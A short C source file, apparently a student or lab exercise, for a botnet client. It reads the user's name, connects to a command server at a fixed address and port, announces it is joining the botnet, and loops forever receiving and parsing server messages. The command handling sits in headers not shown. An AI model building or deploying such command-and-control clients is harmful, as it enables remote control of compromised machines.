#include "lib/utils.h"
#include "lib/macros.h"
#include "lib/connect.h"

int main(void) {

	char* name = getenv("USER");//Get the client's username and store it in name
	int channel = init_channel("128.0.0.1", 9999, name);//initiate a channel given SERVER, PORT, and name;
	char msg[CMD_LENGTH];
	//Allocate stack space of size CMD_LENGTH to hold data of type char. Call the stack pointer msg
	printf("%s joining the botnet\n", name);
    int sock = init_socket("128.0.0.1", 9999, name);

	
	while (1) {
	  recieve(channel, msg);
	  parse(channel, msg, name);
	}
	
}
